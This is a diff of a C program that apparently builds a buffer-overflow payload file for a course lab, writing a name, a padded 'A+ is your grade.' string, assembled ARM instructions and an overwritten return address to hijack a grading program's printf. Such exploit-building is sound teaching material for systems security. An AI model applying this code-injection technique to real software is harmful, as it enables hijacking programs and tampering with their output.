@@ -10,32 +10,21 @@ int main(void) {
    unsigned long movLocation;
    psFile = fopen("dataAplus", "w");
    fputs("Rolex",psFile);   
+   putc('\0', psFile);
 
-   for (i = 0; i < 7; i++)
-      putc('\0', psFile);
+   fputs("A+ is your grade.\n",psFile); 
 
-   mov = MiniAssembler_mov(1, 'A');
-   adr = MiniAssembler_adr(0, 0x400960, 0x420068);
-   strb = MiniAssembler_strb(1,0);
-   fwrite(&mov, sizeof(unsigned int), 1, psFile);
-   fwrite(&adr, sizeof(unsigned int), 1, psFile);
-   fwrite(&strb, sizeof(unsigned int), 1, psFile);  
-
-   mov = MiniAssembler_mov(1, '+');
-   adr = MiniAssembler_adr(0, 0x400961, 0x420074);
-   strb = MiniAssembler_strb(1,0);
-   fwrite(&mov, sizeof(unsigned int), 1, psFile);
-   fwrite(&adr, sizeof(unsigned int), 1, psFile);
-   fwrite(&strb, sizeof(unsigned int), 1, psFile);    
+   for (i = 0; i < 12; i++)
+      putc('\0', psFile);    
    
    /* printf parameters  */
-   adr = MiniAssembler_adr(0, 0x400960, 0x42007c);
-   adr2 = MiniAssembler_mov(1, 0);
+   adr = MiniAssembler_adr(0, 0x42005e, 0x42007c);
+   mov = MiniAssembler_mov(1, 0);
    branch = MiniAssembler_b(0x400874,0x420084);  
    movLocation = 0x420070; 
       
    fwrite(&adr, sizeof(unsigned int), 1, psFile);
-   fwrite(&adr2, sizeof(unsigned int), 1, psFile); 
+   fwrite(&mov, sizeof(unsigned int), 1, psFile); 
    fwrite(&branch, sizeof(unsigned int), 1, psFile);
    fwrite (&movLocation, sizeof(unsigned long), 1, psFile);
    fclose(psFile);
